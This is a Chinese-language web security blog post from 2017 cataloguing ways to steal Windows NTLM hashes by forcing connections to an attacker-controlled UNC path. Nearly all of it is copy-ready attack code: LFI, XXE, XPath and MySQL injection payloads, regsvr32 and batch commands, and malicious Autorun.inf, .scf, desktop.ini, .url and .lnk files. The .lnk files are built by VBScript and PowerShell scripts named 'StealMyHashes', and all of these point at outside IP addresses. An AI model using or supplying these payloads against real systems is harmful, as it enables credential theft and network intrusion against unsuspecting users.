窃取NTLM HASH的多种奇妙方法

Stbird • 2017年3月27日 • Web安全 • 阅读 612

LFI（本地包含）

在PHP中利用include()函数实现解析网络路径的目的

http：//host.tld/？page = //11.22.33.44/@OsandaMalith

XXE

在这里，我使用“php://filter/convert.base64-encode/resource=”脚本来解析网络路径。

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=
//11.22.33.44/@OsandaMalith" >
]>
<root>
 <name></name>
 <tel></tel>
 <email>OUT&xxe;OUT</email>
 <password></password>
</root>

XPath Injection

通常，out-of-band(OOB) XPath注入攻击中，doc()函数可用于解析网络路径

http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')

MySQL Injection

MySql out-of-band注入中，我写了一篇帖子，大家可以看看。你也可以使用“INTO OUTFILE”去解析一个网络路径。

http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00

Regsvr32

在尝试使用.sct文件时，意外发现这个。

regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll

Batch

Batch有很多方法可以去实现目的：

echo 1 > //192.168.0.1/abc
pushd \\192.168.0.1\abc
cmd /k \\192.168.0.1\abc
cmd /c \\192.168.0.1\abc
start \\192.168.0.1\abc
mkdir \\192.168.0.1\abc
type\\192.168.0.1\abc
dir\\192.168.0.1\abc
find, findstr, [x]copy, move, replace, del, rename and many more!

Auto-Complete

你只需要键入“\\host\”，在资源管理器和运行对话框下进行操作将自动完成。

Autorun.inf

从Windows 7开始，此功能是被禁用的。但是你可以通过修改自动运行的组策略来启用这个功能。使用时最好确保Autorun.inf文件是隐藏的，方法如下：

[autorun]
open=\\35.164.153.224\setup.exe
icon=something.ico
action=open Setup.exe

Shell命令文件

你可以将其保存为something.scf，一旦打开文件夹资源管理器，它就会尝试解析图标的网络路径。

[Shell]
Command=2
IconFile=\\35.164.153.224\test.ico
[Taskbar]
Command=ToggleDesktop

Desktop.ini

Desktop.ini文件包含了要应用于该文件夹的图标信息。我们可以用这个来解析一个网络路径。一旦你打开文件夹，你应该就能得到hashes。

mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini

在Windows XP系统中，desktop.ini文件使用“IcondFile”代替了“IconResource”。

[.ShellClassInfo]
IconFile=\\192.168.0.1\aa
IconIndex=1337

快捷方式文件（.lnk）

我们可以创建一个包含我们网络路径的快捷方式，当打开快捷方式时，Windows将尝试解析网络路径。你还可以指定快捷键来触发快捷方式。对于图标位置，你可以使用Windows二进制文件的名称，或在system32目录中的shell32.dll，Ieframe.dll，imageres.dll，pnidui.dll或wmploc.dll等。

Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = shl.CurrentDirectory
 
Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk"))
 
sc.TargetPath = "\\35.164.153.224\@OsandaMalith"
sc.WindowStyle = 1
sc.HotKey = "Ctrl+Alt+O"
sc.IconLocation = "%windir%\system32\shell32.dll, 3"
sc.Description = "I will Steal your Hashes"
sc.Save

Powershell版本：

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

Internet快捷键（.url）

Windows中的另一个快捷方式是Internet快捷方式。你可以将下面代码保存为something.url文件

echo [InternetShortcut]> stealMyHashes.url 
echo URL = file：//192.168.0.1/@OsandaMalith >> stealMyHashes.url

注册表自动运行

你可以在以下路径中添加新的注册表项：

HKEY_LOCAL_MACHINE \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
HKEY_LOCAL_MACHINE \ Software \ Microsoft \ Windows \ CurrentVersion \ RunOnce
HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ RunOnce

Powershell

Powershell中又很多可以解析网络路径的脚本。

Invoke-Item \\192.168.0.1\aa
 Get-Content \\192.168.0.1\aa
 Start-Process \\192.168.0.1\aa

IE

IE将解析UNC路径。例如：

< img src = “ \\\\ 192.168.0.1 \\ aa ” >

你也可以注入到XSS中，或你发现的SQL注入情况中，例如：

http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
